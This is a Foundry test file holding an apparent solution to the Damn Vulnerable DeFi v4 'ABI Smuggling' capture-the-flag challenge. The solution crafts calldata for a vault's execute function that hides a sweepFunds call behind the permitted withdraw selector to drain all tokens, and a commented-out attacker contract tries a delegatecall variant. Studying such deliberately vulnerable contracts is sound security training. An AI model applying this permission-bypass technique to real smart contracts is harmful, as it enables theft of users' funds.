// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // sweepFunds
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // withdraw
        
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    // function test_assertInitialState() public {
    //     // Vault is initialized
    //     assertGt(vault.getLastWithdrawalTimestamp(), 0);
    //     assertTrue(vault.initialized());

    //     // Token balances are correct
    //     assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    //     assertEq(token.balanceOf(player), 0);

    //     // Cannot call Vault directly
    //     vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
    //     vault.sweepFunds(deployer, IERC20(address(token)));
    //     vm.prank(player);
    //     vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
    //     vault.withdraw(address(token), player, 1e18);
    // }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public 
    checkSolvedByPlayer 
    {
        bytes memory sweepCall = abi.encodeWithSelector(vault.sweepFunds.selector, player, address(token));
        bytes memory executeCall = abi.encodeWithSelector(
            vault.execute.selector, 
            address(vault), // 32 bytes x1
            sweepCall, // 32 bytes x2
            uint256(1), //  32 bytes x3
            vault.withdraw.selector // This is a function that player is allowed to call, but the real actionData has another parameter
        );
        address(vault).call(executeCall);
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


// contract ATTACKER {
//     function attack(SelfAuthorizedVault vault, address player, DamnValuableToken token) public {
//         // register on THIS storage allowance to call 
//         bytes32 sweepPermission = vault.getActionId(vault.sweepFunds.selector, address(this), address(this)); // sweepFunds
//         bytes32[] memory ids = new bytes32[](1); 
//         ids[0] = sweepPermission;
//         bytes memory permissionsCall = abi.encodeWithSelector(vault.setPermissions.selector, ids);

//         address(vault).delegatecall(permissionsCall);

//         // execute the sweep 
//         bytes memory sweepCall = abi.encodeWithSelector(vault.sweepFunds.selector, player, address(token));
//         bytes memory executeCall = abi.encodeWithSelector(vault.execute.selector, address(this), sweepCall);
//         bytes memory executeCall2 = abi.encodeWithSelector(vault.execute.selector, address(this), executeCall);
//         address(vault).delegatecall(executeCall2);
//     }

//     function ignite(SelfAuthorizedVault vault, address player, DamnValuableToken token) public {
//         bytes memory callData = abi.encodeWithSignature("attack(address,address,address)", vault, player, token);
//         address(this).call(callData);
//     }
// }